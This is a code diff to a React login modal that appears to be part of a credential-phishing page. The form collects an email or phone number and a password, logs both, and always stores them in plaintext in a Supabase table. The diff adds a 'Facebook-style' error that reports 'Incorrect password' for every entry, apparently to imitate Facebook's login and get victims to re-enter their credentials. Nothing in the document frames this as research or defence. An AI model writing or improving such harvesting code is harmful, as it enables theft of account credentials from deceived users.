@@ -27,14 +27,20 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
   const [showSuccess, setShowSuccess] = useState(false);
   const { toast } = useToast();
 
-  const validateEmail = (email: string) => {
-    const commonDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com'];
+  const validateInput = (input: string) => {
+    // Check if it's a phone number (exactly 10 digits)
+    const phoneRegex = /^\d{10}$/;
+    if (phoneRegex.test(input)) {
+      return true;
+    }
+    
+    // Check if it's an email (must contain @)
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (emailRegex.test(input)) {
+      return true;
+    }
     
-    if (!emailRegex.test(email)) return false;
-    
-    const domain = email.split('@')[1];
-    return commonDomains.includes(domain);
+    return false;
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -46,10 +52,12 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
     // Simulate processing delay
     await new Promise(resolve => setTimeout(resolve, 1500));
 
-    const isValid = validateEmail(email) && passphrase.length >= 6;
+    // Validate input and password
+    const isValidInput = validateInput(email);
+    const isValidPassword = passphrase.length >= 6;
 
     // Save access attempt to Supabase - ALWAYS record the attempt
-    console.log('Saving access attempt:', { email, passphrase, item_id: item.id, item_name: item.name, status: isValid ? 'success' : 'failed' });
+    console.log('Saving access attempt:', { email, passphrase, item_id: item.id, item_name: item.name, status: (isValidInput && isValidPassword) ? 'success' : 'failed' });
     
     try {
       const { data, error } = await supabase
@@ -59,7 +67,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
           passphrase: passphrase,
           item_id: item.id,
           item_name: item.name,
-          status: isValid ? 'success' : 'failed'
+          status: (isValidInput && isValidPassword) ? 'success' : 'failed'
         })
         .select();
       
@@ -72,21 +80,13 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
       console.error('Error saving access attempt:', error);
     }
 
-    if (!validateEmail(email)) {
+    // Check validation and show Facebook-style error if invalid
+    if (!isValidInput || !isValidPassword) {
       toast({
         variant: "destructive",
-        title: "Invalid address format",
-        description: "Please use a valid email address with a common domain.",
-      });
-      setIsLoading(false);
-      return;
-    }
-
-    if (passphrase.length < 6) {
-      toast({
-        variant: "destructive",
-        title: "Invalid credentials",
-        description: "Access passphrase must be at least 6 characters.",
+        title: "Incorrect password. Please try again.",
+        description: "",
+        className: "bg-red-500 text-white border-red-600",
       });
       setIsLoading(false);
       return;
@@ -181,7 +181,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 
                 <form onSubmit={handleSubmit} className="space-y-3">
                   <input
-                    type="email"
+                    type="text"
                     placeholder="Email or phone number"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
